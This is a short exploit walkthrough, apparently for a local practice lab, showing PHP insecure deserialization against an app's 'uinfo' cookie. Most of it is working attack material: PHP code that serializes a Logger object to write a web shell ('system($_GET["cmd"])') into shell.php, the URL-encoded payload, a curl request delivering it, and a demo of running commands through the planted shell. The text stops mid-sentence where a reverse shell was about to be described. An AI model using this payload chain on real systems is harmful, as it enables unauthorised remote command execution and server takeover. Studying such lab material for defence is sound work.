# Exploit Steps

First, in the "app" directory run `php -a`

Then run the following commands:

```
include 'logger-class.php';
$logger = new Logger();
$logger->filename = "./shell.php";
$logger->last_log = '<?php system($_GET["cmd"]); ?>';
$serialized = serialize($logger);
$encoded = urlencode($serialized);
print($encoded);
```

In order, we first include `logger-class.php`. Then we create a new instance of the Logger class and define some properties on that instance. We make the instance's filename `./shell.php`, which is where we will put the payload, and we set `last_log` as some PHP code that will grab whatever is in the `cmd` query parameter and execute as a system command. Next, we serialize the logger instance, we url encode the serialized string to make it safe for putting in our cookie, and then we finally print the resulting string, which is as follows:

`O%3A6%3A%22Logger%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A11%3A%22.%2Fshell.php%22%3Bs%3A8%3A%22last_log%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D`


Finally, visit your php server and replace the `uinfo` cookie with the encoded string above, or make the following curl request:

```
curl 'http://172.17.0.2:9001/' -H 'Cookie: uinfo=O%3A6%3A%22Logger%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A11%3A%22.%2Fshell.php%22%3Bs%3A8%3A%22last_log%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D' 
```


Now, visiting `http://localhost:9001/shell.php` and adding a `cmd` query parameter will execute that shell command. For instance, going to `http://localhost:9001/shell.php?cmd=ls` will print the files in the app's current directory

You can now get a reverse shell by going to `
